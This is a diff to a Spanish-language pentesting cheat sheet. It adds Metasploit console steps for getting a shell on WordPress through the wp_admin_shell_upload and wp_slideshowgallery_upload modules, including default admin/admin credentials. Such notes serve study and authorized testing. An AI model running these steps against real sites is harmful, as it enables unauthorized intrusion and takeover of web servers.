@@ -33,12 +33,25 @@ Si ya tenemos una sesión activa como root, podemos usar el siguiente modulo par
 # Explotaremos WordPress siendo el usuario 'admin'
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
-	❯ use exploit/unix/webapp/wp_admin_shell_upload         # Usamos el exploit                
+	❯ use exploit/unix/webapp/wp_admin_shell_upload       # Usamos el exploit                
 	❯ options
-	❯ set PASSWORD ❮passwd❯                                 # Colocamos la passwd con la que ingresamos a WordPress
+	❯ set PASSWORD ❮passwd❯                               # Colocamos la passwd con la que ingresamos a WordPress
 	❯ set USERNAME ❮user❯                                 # Colocamos el usuario con la que ingresamos a WordPress
 	❯ set RHOSTS ❮IP❯     
 	❯ set WPCHECK False              
+	❯ exploit
+```
+
+```bash 
+# Explotaremos WordPress siendo el usuario 'admin'
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use exploit/unix/webapp/wp_slideshowgallery_upload       # Usamos el exploit                
+	❯ options
+	❯ set RHOSTS ❮IP❯
+	❯ set TARGETURI /weblog
+	❯ set WP_PASSWORD admin
+	❯ set WP_USER admin
 	❯ exploit
 ```
 
